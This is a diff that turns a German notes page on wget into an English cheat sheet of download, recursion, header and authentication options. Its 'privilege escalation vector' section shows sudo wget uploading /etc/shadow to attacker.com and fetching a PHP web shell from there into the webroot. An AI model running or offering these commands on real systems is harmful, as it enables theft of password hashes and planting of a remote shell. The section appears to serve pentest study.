@@ -1,31 +1,43 @@
----
-description: https://wiki.ubuntuusers.de/wget/
----
+# wget file downloads because getting files from remote.
 
-# wget
+## basic usage
+```bash
+wget https://example.com/file.txt        # download single file
+wget -O newname.txt https://site.com/file.txt    # save with different name
+wget -c https://site.com/largefile.zip   # continue interrupted download
+```
 
-## Beschreibung
+## recursive downloads
+```bash
+wget -r https://site.com/                # recursive download
+wget -r -l 2 https://site.com/           # limit recursion depth to 2
+wget -r -A "*.pdf" https://site.com/     # only download PDFs
+```
 
+## useful options
+```bash
+wget --spider https://site.com/file.txt  # check if file exists (no download)
+wget -q https://site.com/file.txt        # quiet mode
+wget --user-agent="Custom Agent" url     # custom user agent
+wget --header="Cookie: session=abc" url  # custom headers
+```
 
+## authentication
+```bash
+wget --user=username --password=pass url # HTTP basic auth
+wget --certificate=cert.pem url          # client certificate
+```
 
-## SUDO Priv Escalation
+## privilege escalation vector
+if `wget` in `sudo -l`:
+```bash
+# can transfer files as root
+sudo wget --post-file=/etc/shadow http://attacker.com/upload
+sudo wget http://attacker.com/shell.php -O /var/www/html/shell.php
+```
 
-Wenn wget in sudo -l aufgeführt wird, können Dateien per root transferiert werden.
-
-Manche können nicht geholt werden wenn keine Leseberechtigung vorhanden ist! bspw /etc/sudoers/
-
-* Wird php auf dem Webserver ausgefüllt, kann eine php-shell im webroot hinterlegt werden.
-* Es kann aber auch per --post-file eine Datei auf den Angreifer geladen werden und wieder zur Aktualisierung zurück geladen werden.
-
-<figure><img src="../../../.gitbook/assets/wget_sudo.png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-## Parameter
-
-\--spider : prüft ob vorhanden ohne herunterzuladen
-
-
-
+## notes
+[!] recursive downloads can grab entire websites - use carefully
+[!] `--spider` tests availability without downloading
+[!] sudo wget can read/write files as root - major privesc vector
+[!] some files may not be readable without proper permissions
